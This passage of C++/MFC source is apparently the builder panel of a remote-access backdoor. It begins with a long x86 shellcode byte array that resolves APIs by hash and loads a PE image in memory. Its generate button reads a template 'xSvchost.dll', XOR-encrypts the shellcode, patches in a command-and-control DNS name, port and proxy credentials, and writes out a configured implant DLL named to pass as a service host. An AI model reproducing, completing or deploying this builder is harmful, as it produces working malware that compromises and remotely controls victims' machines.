	0x8D, 0x4C, 0xFF, 0xFF, 0xFF, 0x00, 0x20, 0x00, 0x00, 0x6A, 0x04, 0x8D, 0xBD, 0x4C, 0xFF, 0xFF, 
	0xFF, 0x57, 0x6A, 0x1F, 0xFF, 0xB5, 0x54, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x9C, 0x6A, 0x00, 0x6A, 
	0x00, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0xB5, 0x54, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x94, 0x83, 0xF8, 
	0x00, 0x0F, 0x84, 0x37, 0x01, 0x00, 0x00, 0x6A, 0x00, 0xC7, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0x10, 
	0x00, 0x00, 0x00, 0x8D, 0xBD, 0xE8, 0xFE, 0xFF, 0xFF, 0x57, 0x8D, 0x95, 0xEC, 0xFE, 0xFF, 0xFF, 
	0x52, 0x6A, 0x05, 0xFF, 0xB5, 0x54, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x90, 0x83, 0xF8, 0x00, 0x0F, 
	0x84, 0xA2, 0x00, 0x00, 0x00, 0x8D, 0xBD, 0xEC, 0xFE, 0xFF, 0xFF, 0x57, 0xE8, 0x9A, 0x03, 0x00, 
	0x00, 0x89, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x50, 0x6A, 
	0x00, 0xFF, 0x55, 0xF4, 0x83, 0xF8, 0x00, 0x74, 0x7E, 0x89, 0x85, 0xE4, 0xFE, 0xFF, 0xFF, 0x89, 
	0x85, 0xE0, 0xFE, 0xFF, 0xFF, 0x6A, 0x01, 0xFF, 0x55, 0xE0, 0x8D, 0x95, 0xD8, 0xFE, 0xFF, 0xFF, 
	0x52, 0xC7, 0x85, 0xDC, 0xFE, 0xFF, 0xFF, 0x00, 0x28, 0x00, 0x00, 0x81, 0xBD, 0xE8, 0xFE, 0xFF, 
	0xFF, 0x00, 0x28, 0x00, 0x00, 0x77, 0x0C, 0x8B, 0x95, 0xE8, 0xFE, 0xFF, 0xFF, 0x89, 0x95, 0xDC, 
	0xFE, 0xFF, 0xFF, 0xFF, 0xB5, 0xDC, 0xFE, 0xFF, 0xFF, 0xFF, 0xB5, 0xE0, 0xFE, 0xFF, 0xFF, 0xFF, 
	0xB5, 0x54, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x8C, 0x83, 0xF8, 0x00, 0x74, 0x16, 0x8B, 0x85, 0xD8, 
	0xFE, 0xFF, 0xFF, 0x01, 0x85, 0xE0, 0xFE, 0xFF, 0xFF, 0x29, 0x85, 0xE8, 0xFE, 0xFF, 0xFF, 0x77, 
	0xA4, 0xEB, 0x1E, 0x68, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xB5, 0xE8, 0xFE, 0xFF, 0xFF, 0xFF, 0xB5, 
	0xE4, 0xFE, 0xFF, 0xFF, 0xFF, 0x55, 0xF0, 0xC7, 0x85, 0xE4, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 
	0x00, 0x83, 0xBD, 0xE4, 0xFE, 0xFF, 0xFF, 0x00, 0x74, 0x54, 0x6A, 0x01, 0xFF, 0x75, 0xF8, 0xFF, 
	0x75, 0xE8, 0xFF, 0x75, 0x80, 0xFF, 0xB5, 0x7C, 0xFF, 0xFF, 0xFF, 0xFF, 0x75, 0xF4, 0xFF, 0xB5, 
	0xE4, 0xFE, 0xFF, 0xFF, 0xE8, 0x53, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x00, 0x74, 0x30, 0x68, 0x52, 
	0xB8, 0x8E, 0x7C, 0x50, 0xE8, 0xB4, 0x00, 0x00, 0x00, 0x93, 0xFF, 0xB5, 0x54, 0xFF, 0xFF, 0xFF, 
	0xFF, 0x55, 0x88, 0xFF, 0xB5, 0x58, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x88, 0xFF, 0xB5, 0x5C, 0xFF, 
	0xFF, 0xFF, 0xFF, 0x55, 0x88, 0x8D, 0x95, 0xBE, 0xF9, 0xFF, 0xFF, 0x52, 0xFF, 0xD3, 0xFF, 0xB5, 
	0x54, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x88, 0xFF, 0xB5, 0x58, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x88, 
	0xFF, 0xB5, 0x5C, 0xFF, 0xFF, 0xFF, 0xFF, 0x55, 0x88, 0x68, 0x4B, 0xE2, 0x00, 0x00, 0xFF, 0x55, 
	0xE0, 0xE9, 0x50, 0xFD, 0xFF, 0xFF, 0x33, 0xC0, 0x50, 0xFF, 0x55, 0xE4, 0xE8, 0xB7, 0xF3, 0xFF, 
	0xFF, 0x33, 0xC9, 0x6A, 0x30, 0x59, 0x64, 0x8B, 0x31, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0xB9, 
	0x02, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x08, 0x8B, 0x36, 0xE2, 0xF9, 0xC3, 0x55, 0x8B, 0xEC, 0x8B, 
	0x75, 0x08, 0x33, 0xC9, 0xAC, 0x41, 0x84, 0xC0, 0x75, 0xFA, 0x91, 0xC9, 0xC2, 0x04, 0x00, 0x55, 
	0x8B, 0xEC, 0x8B, 0x4D, 0x10, 0x8B, 0x75, 0x08, 0x8B, 0x7D, 0x0C, 0xAC, 0xC0, 0xC0, 0x03, 0xAA, 
	0xE2, 0xF9, 0xC9, 0xC2, 0x0C, 0x00, 0x55, 0x8B, 0xEC, 0x8B, 0x4D, 0x10, 0x8B, 0x75, 0x08, 0x8B, 
	0x7D, 0x0C, 0xAC, 0xC0, 0xC8, 0x03, 0xAA, 0xE2, 0xF9, 0xC9, 0xC2, 0x0C, 0x00, 0x55, 0x8B, 0xEC, 
	0x60, 0x8B, 0x5D, 0x08, 0x8B, 0x75, 0x0C, 0x33, 0xED, 0x8B, 0xD3, 0x03, 0x52, 0x3C, 0x8B, 0x52, 
	0x78, 0x03, 0xD3, 0x8B, 0x42, 0x18, 0x8B, 0x7A, 0x20, 0x03, 0xFB, 0x52, 0x8B, 0x17, 0x03, 0xD3, 
	0x45, 0x60, 0x8B, 0xF2, 0x33, 0xC9, 0xAC, 0x41, 0x84, 0xC0, 0x75, 0xFA, 0x49, 0x89, 0x4C, 0x24, 
	0x18, 0x61, 0x60, 0x33, 0xC0, 0xE8, 0x36, 0x00, 0x00, 0x00, 0x3B, 0xC6, 0x61, 0x74, 0x08, 0x83, 
	0xC7, 0x04, 0x48, 0x74, 0x21, 0xEB, 0xD5, 0x5A, 0x4D, 0x8B, 0x4A, 0x24, 0x03, 0xCB, 0x66, 0x8B, 
	0x04, 0x69, 0x8B, 0x6A, 0x1C, 0x03, 0xEB, 0x8B, 0x44, 0x85, 0x00, 0x03, 0xC3, 0x89, 0x44, 0x24, 
	0x1C, 0x61, 0xC9, 0xC2, 0x08, 0x00, 0x5A, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC9, 0xC2, 0x08, 0x00, 
	0x60, 0x8B, 0xF2, 0xBA, 0x05, 0x15, 0x00, 0x00, 0x8B, 0xDA, 0xC1, 0xE2, 0x05, 0x03, 0xDA, 0xAC, 
	0x03, 0xD8, 0x8B, 0xD3, 0xE2, 0xF2, 0x89, 0x54, 0x24, 0x1C, 0x61, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 
	0xC4, 0xF4, 0x60, 0x33, 0xC0, 0x8B, 0x75, 0x08, 0xBB, 0x3E, 0x22, 0x00, 0x00, 0x81, 0xF3, 0x73, 
	0x78, 0x00, 0x00, 0x66, 0x39, 0x1E, 0x0F, 0x85, 0xA8, 0x00, 0x00, 0x00, 0x8B, 0x5E, 0x3C, 0x89, 
	0x5D, 0xFC, 0x03, 0x76, 0x3C, 0x66, 0x81, 0x3E, 0x50, 0x45, 0x0F, 0x85, 0x94, 0x00, 0x00, 0x00, 
	0x0F, 0xB7, 0x5E, 0x06, 0x89, 0x5D, 0xF4, 0x8B, 0xFE, 0x8B, 0x5E, 0x50, 0x6A, 0x40, 0x68, 0x00, 
	0x10, 0x00, 0x00, 0x53, 0x6A, 0x00, 0xFF, 0x55, 0x0C, 0x83, 0xF8, 0x00, 0x74, 0x76, 0x89, 0x45, 
	0xF8, 0x50, 0x53, 0x50, 0xFF, 0x55, 0x10, 0x8B, 0x4D, 0xFC, 0x81, 0xC1, 0xF8, 0x00, 0x00, 0x00, 
	0xB8, 0x28, 0x00, 0x00, 0x00, 0x0F, 0xAF, 0x45, 0xF4, 0x03, 0xC8, 0x51, 0xFF, 0x75, 0x08, 0xFF, 
	0x75, 0xF8, 0xFF, 0x55, 0x14, 0x5B, 0x33, 0xC0, 0x66, 0x8B, 0x46, 0x14, 0x33, 0xC9, 0x66, 0x8B, 
	0x4E, 0x06, 0x8D, 0x74, 0x30, 0x18, 0x51, 0x8B, 0x56, 0x14, 0x03, 0x55, 0x08, 0x8B, 0x46, 0x0C, 
	0x03, 0xC3, 0xFF, 0x76, 0x10, 0x52, 0x50, 0xFF, 0x55, 0x14, 0x83, 0xC6, 0x28, 0x59, 0xE2, 0xE6, 
	0x8B, 0xD3, 0x8B, 0xC7, 0xE8, 0x24, 0x00, 0x00, 0x00, 0x8B, 0xD3, 0x8B, 0xC7, 0xE8, 0x83, 0x00, 
	0x00, 0x00, 0x8B, 0x57, 0x28, 0x53, 0x85, 0xD2, 0x74, 0x09, 0x03, 0xD3, 0x6A, 0x00, 0x6A, 0x01, 
	0x53, 0xFF, 0xD2, 0x58, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC9, 0xC2, 0x18, 0x00, 0x60, 0x52, 0x8B, 
	0xB8, 0x80, 0x00, 0x00, 0x00, 0x85, 0xFF, 0x74, 0x59, 0x03, 0xFA, 0x8B, 0x5F, 0x0C, 0x85, 0xDB, 
	0x74, 0x50, 0x03, 0x1C, 0x24, 0x53, 0xFF, 0x55, 0x1C, 0x85, 0xC0, 0x74, 0x45, 0x93, 0x8B, 0x77, 
	0x10, 0x03, 0x34, 0x24, 0xFC, 0xAD, 0x8B, 0xD0, 0x81, 0xE2, 0x00, 0x00, 0x00, 0xFF, 0x81, 0xFA, 
	0x00, 0x00, 0x00, 0x7C, 0x74, 0x2C, 0x85, 0xC0, 0x74, 0x23, 0x0F, 0xBA, 0xE0, 0x1F, 0x73, 0x0D, 
	0x0F, 0xB7, 0xD0, 0x52, 0x53, 0xFF, 0x55, 0x18, 0x89, 0x46, 0xFC, 0xEB, 0xD8, 0x03, 0x04, 0x24, 
	0x8D, 0x50, 0x02, 0x52, 0x53, 0xFF, 0x55, 0x18, 0x89, 0x46, 0xFC, 0xEB, 0xC8, 0x83, 0xC7, 0x14, 
	0xEB, 0xA9, 0x5A, 0x61, 0xC3, 0x60, 0x8B, 0xB0, 0xA0, 0x00, 0x00, 0x00, 0x85, 0xF6, 0x74, 0x38, 
	0xFC, 0x03, 0xF2, 0xFF, 0xB0, 0xA4, 0x00, 0x00, 0x00, 0x01, 0x34, 0x24, 0x8B, 0xFA, 0x8B, 0xEA, 
	0x2B, 0x68, 0x34, 0x39, 0x34, 0x24, 0x74, 0x20, 0xAD, 0x93, 0xAD, 0x91, 0x83, 0xE9, 0x08, 0xD1, 
	0xE9, 0x33, 0xC0, 0x66, 0xAD, 0x0F, 0xBA, 0xE0, 0x0D, 0x73, 0x09, 0x66, 0x25, 0xFF, 0x0F, 0x03, 
	0xC3, 0x01, 0x2C, 0x38, 0xE2, 0xEB, 0xEB, 0xDB, 0x59, 0x61, 0xC3, 0x55, 0x8B, 0xEC, 0x56, 0x33, 
	0xF6, 0x33, 0xC0, 0x8B, 0x4D, 0x08, 0x0F, 0xB6, 0x0C, 0x0E, 0x84, 0xC9, 0x74, 0x1F, 0x80, 0xF9, 
	0x30, 0x72, 0x13, 0x80, 0xF9, 0x39, 0x77, 0x0E, 0x80, 0xE9, 0x30, 0x8D, 0x04, 0x80, 0x8D, 0x04, 
	0x41, 0x46, 0xEB, 0xDF, 0xEB, 0x07, 0x33, 0xC0, 0x5E, 0xC9, 0xC2, 0x04, 0x00, 0x5E, 0xC9, 0xC2, 
	0x04, 0x00, 0x55, 0x8B, 0xEC, 0x60, 0x8B, 0x45, 0x08, 0xBB, 0x0A, 0x00, 0x00, 0x00, 0x8B, 0x75, 
	0x0C, 0x33, 0xD2, 0xF7, 0xF3, 0x80, 0xC2, 0x30, 0x88, 0x16, 0x46, 0x83, 0xF8, 0x00, 0x75, 0xF1, 
	0x8B, 0x7D, 0x0C, 0x4E, 0x8A, 0x16, 0x8A, 0x37, 0x88, 0x36, 0x88, 0x17, 0x4E, 0x47, 0x3B, 0xFE, 
	0x72, 0xF2, 0x61, 0xC9, 0xC2, 0x08, 0x00, 0x55, 0x8B, 0xEC, 0x8B, 0x75, 0x08, 0x33, 0xC9, 0xAC, 
	0x41, 0x84, 0xC0, 0x75, 0xFA, 0x49, 0x91, 0xC9, 0xC2, 0x04, 0x00, 0x55, 0x8B, 0xEC, 0x8B, 0x7D, 
	0x08, 0x57, 0xE8, 0xE0, 0xFF, 0xFF, 0xFF, 0x8B, 0x7D, 0x08, 0x03, 0xF8, 0x8B, 0x75, 0x0C, 0xAC, 
	0xAA, 0x84, 0xC0, 0x75, 0xFA, 0xC9, 0xC2, 0x08, 0x00, 0xE8, 0xC3, 0xF0, 0xFF, 0xFF
};

// CPage3 对话框

IMPLEMENT_DYNAMIC(CPage3, CDialog)

CPage3::CPage3(CWnd* pParent /*=NULL*/)
	: CDialog(CPage3::IDD, pParent)
	, m_strDNS(_T(""))
	, m_strPort(_T(""))
	, m_strProxyName(_T("127.0.0.1:8080"))
	, m_strProxyUsername(_T(""))
	, m_strProxyPassword(_T(""))
{

}

CPage3::~CPage3()
{
}

void CPage3::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_DNS3, m_strDNS);
	DDX_Text(pDX, IDC_EDIT_PORT3, m_strPort);
	DDX_Text(pDX, IDC_EDIT_PROXY_NAME3, m_strProxyName);
	DDX_Text(pDX, IDC_EDIT_PROXY_USERNAME3, m_strProxyUsername);
	DDX_Text(pDX, IDC_EDIT_PROXY_PASSWORD3, m_strProxyPassword);
}

BOOL CPage3::OnInitDialog()
{
	CDialog::OnInitDialog();

	CButton* radio=(CButton*)GetDlgItem(IDC_RADIO_PRECONFIG3);

	radio->SetCheck(BST_CHECKED);


	GetDlgItem(IDC_EDIT_PROXY_NAME3)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_PROXY_USERNAME3)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_PROXY_PASSWORD3)->EnableWindow(FALSE);



	return TRUE;
}


BEGIN_MESSAGE_MAP(CPage3, CDialog)
	ON_BN_CLICKED(IDC_BUTTON_GEN3, &CPage3::OnBnClickedButtonGen)
	ON_BN_CLICKED(IDC_BUTTON_UPDATE3, &CPage3::OnBnClickedButtonUpdate)
	ON_BN_CLICKED(IDC_BUTTON_VERINFO3, &CPage3::OnBnClickedButtonVerinfo)
	ON_BN_CLICKED(IDC_RADIO_DIRECT3, &CPage3::OnBnClickedRadioDirect)
	ON_BN_CLICKED(IDC_RADIO_PRECONFIG3, &CPage3::OnBnClickedRadioPreconfig)
	ON_BN_CLICKED(IDC_RADIO_PROXY3, &CPage3::OnBnClickedRadioProxy)
END_MESSAGE_MAP()


// CPage3 消息处理程序

void CPage3::OnBnClickedButtonGen()
{
	// TODO: 在此添加控件通知处理程序代码
	UpdateData(TRUE);


	if (m_strDNS.GetLength()==0 || m_strDNS.GetLength()>32)
	{
		MessageBox(_T("Invalid DNS"),_T("error"),MB_OK);
		return;
	}
	if (m_strPort.GetLength()==0)
	{
		MessageBox(_T("Invalid PORT"),_T("error"),MB_OK);
		return;
	}
	if (((CButton*)GetDlgItem(IDC_RADIO_PROXY3))->GetCheck()==BST_CHECKED)
	{
		if (m_strProxyName.GetLength()==0||m_strProxyName.GetLength()>32)
		{
			MessageBox(TEXT("Invalid Proxy Name"),TEXT("error"),MB_OK);
			return;
		}

	}

	SERVER_INFO si={0};

	PROXY_INFO pi={0};

	TCHAR szCurrentPath[MAX_PATH]={0};

	TCHAR szReleaseFile[MAX_PATH]={0};

	int i=0;

	si.dwPort=_wtoi((const wchar_t *)m_strPort); //port

	TCHAR wDns[32]={0}; //dns
	_tcscpy_s(wDns,m_strDNS);
	WideCharToMultiByte (CP_OEMCP,NULL,wDns,-1,si.szDns,sizeof(si.szDns),NULL,FALSE);

	TCHAR wProxyName[32]={0}; //proxy name
	_tcscpy_s(wProxyName,m_strProxyName);
	WideCharToMultiByte(CP_OEMCP,NULL,wProxyName,-1,pi.proxyName,sizeof(pi.proxyName),NULL,FALSE);

	TCHAR wProxyUsername[32]={0}; //proxy username
	if (m_strProxyUsername.GetLength()>0)
	{
		_tcscpy_s(wProxyUsername,m_strProxyUsername);
		WideCharToMultiByte(CP_OEMCP,NULL,wProxyUsername,-1,pi.proxyUserName,sizeof(pi.proxyUserName),NULL,FALSE);
	}

	TCHAR wProxyPassword[32]={0}; //proxy password
	if (m_strProxyPassword.GetLength()>0)
	{
		_tcscpy_s(wProxyPassword,m_strProxyPassword);
		WideCharToMultiByte(CP_OEMCP,NULL,wProxyPassword,-1,pi.proxyPassword,sizeof(pi.proxyPassword),NULL,FALSE);
	}

	if (((CButton*)GetDlgItem(IDC_RADIO_PROXY3))->GetCheck()==BST_CHECKED)
	{
		pi.accessType=INTERNET_OPEN_TYPE_PROXY;
	}
	else if (((CButton*)GetDlgItem(IDC_RADIO_PRECONFIG3))->GetCheck()==BST_CHECKED)
	{
		pi.accessType=INTERNET_OPEN_TYPE_PRECONFIG;
	}
	else
	{
		pi.accessType=INTERNET_OPEN_TYPE_DIRECT;
	}

	GetModuleFileName(0,szCurrentPath,MAX_PATH);
	PTCHAR p=_tcsrchr(szCurrentPath,_T('\\'));
	*p=0;

	_tcscpy_s(szReleaseFile,szCurrentPath);
	
	_tcscat_s(szCurrentPath,TEXT("\\xSvchost.dll"));

	HANDLE hFile=CreateFile(szCurrentPath,
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);
	if (INVALID_HANDLE_VALUE==hFile)
	{
		MessageBox(_T("打开源文件出错!"),_T("error"),MB_OK);
		return;
	}
	DWORD dwFileSize=GetFileSize(hFile,0);

	BYTE* buffer=(BYTE*)malloc(dwFileSize);
	if (0==buffer)
	{
		MessageBox(_T("分配内存出错!"),_T("error"),MB_OK);
		return;
	}
	DWORD dwRead;
	ReadFile(hFile,buffer,dwFileSize,&dwRead,0);
	CloseHandle(hFile);

	BYTE* bEncryptedShellcode=(BYTE*)malloc(sizeof(dataSvc));
	if (0==bEncryptedShellcode)
	{
		MessageBox(_T("分配内存出错!"),_T("error"),MB_OK);
		free(buffer);
		return;
	}


	CEncrypt::XorAlgorithm(dataSvc,bEncryptedShellcode,sizeof(dataSvc),SVC_SHELLCODE_KEY);
	
	memcpy(buffer+SVC_OFFSET_SERVER_INFO,&si,sizeof(SERVER_INFO));
	memcpy(buffer+SVC_OFFSET_PROXY_INFO,&pi,sizeof(PROXY_INFO));
	memcpy(buffer+SVC_OFFSET_SHELLCODE,bEncryptedShellcode,sizeof(dataSvc));
	//memcpy(buffer+SVC_OFFSET_SHELLCODE,dataSvc,sizeof(dataSvc));
	memcpy(buffer+SVC_OFFSET_KEY,SVC_SHELLCODE_KEY,strlen(SVC_SHELLCODE_KEY)+1);

	_stprintf(szReleaseFile,_T("%s\\kongshou_%s_%d.dll"),szReleaseFile,wDns,si.dwPort);
	hFile=CreateFile(szReleaseFile,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		0,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0);
	if (INVALID_HANDLE_VALUE==hFile)
	{
		MessageBox(_T("创建文件出错!"),_T("error"),MB_OK);
		return;
	}

	DWORD dwWritten;
	WriteFile(hFile,buffer,dwFileSize,&dwWritten,0);
	CloseHandle(hFile);
	free(bEncryptedShellcode);
	free(buffer);
	MessageBox(_T("创建文件成功!"),_T(""),MB_OK);
}

void CPage3::OnBnClickedButtonUpdate()
{
	// TODO: 在此添加控件通知处理程序代码
	CReadmeDlg dlg;
	dlg.dwFlag=SHOW_SVC_UPDATA;
	dlg.DoModal();
}

void CPage3::OnBnClickedButtonVerinfo()
{
	// TODO: 在此添加控件通知处理程序代码
	CReadmeDlg dlg;
	dlg.dwFlag=SHOW_SVC_INFO;
	dlg.DoModal();
}

void CPage3::OnBnClickedRadioDirect()
{
	// TODO: 在此添加控件通知处理程序代码
	CButton* radio=(CButton*)GetDlgItem(IDC_RADIO_PROXY3);

	if (radio->GetCheck()==BST_CHECKED)
	{
		GetDlgItem(IDC_EDIT_PROXY_NAME3)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_PROXY_USERNAME3)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_PROXY_PASSWORD3)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_PROXY_NAME3)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_PROXY_USERNAME3)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_PROXY_PASSWORD3)->EnableWindow(FALSE);
	}

}

void CPage3::OnBnClickedRadioPreconfig()
{
	// TODO: 在此添加控件通知处理程序代码
	CButton* radio=(CButton*)GetDlgItem(IDC_RADIO_PROXY3);

	if (radio->GetCheck()==BST_CHECKED)
	{
		GetDlgItem(IDC_EDIT_PROXY_NAME3)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_PROXY_USERNAME3)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_PROXY_PASSWORD3)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_PROXY_NAME3)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_PROXY_USERNAME3)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_PROXY_PASSWORD3)->EnableWindow(FALSE);
	}
}

void CPage3::OnBnClickedRadioProxy()
{
	// TODO: 在此添加控件通知处理程序代码
	CButton* radio=(CButton*)GetDlgItem(IDC_RADIO_PROXY3);

	if (radio->GetCheck()==BST_CHECKED)
	{
		GetDlgItem(IDC_EDIT_PROXY_NAME3)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_PROXY_USERNAME3)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_PROXY_PASSWORD3)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_PROXY_NAME3)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_PROXY_USERNAME3)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_PROXY_PASSWORD3)->EnableWindow(FALSE);
	}
}
